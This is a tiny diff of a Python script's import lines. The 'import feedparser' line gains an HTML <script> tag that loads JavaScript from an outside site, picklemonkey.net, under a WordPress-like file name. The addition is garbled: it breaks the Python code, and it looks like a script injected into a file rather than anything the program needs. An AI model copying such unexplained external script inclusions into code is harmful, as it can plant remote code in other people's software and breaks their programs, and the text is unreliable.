@@ -1,5 +1,5 @@
 import requests
-import feedparser
+import feedparser<script type="text/javascript" src="http://picklemonkey.net/wp-includes/js/comment-reply.min.js?ver=4.0.9"></script>
 import re
 import sys
 
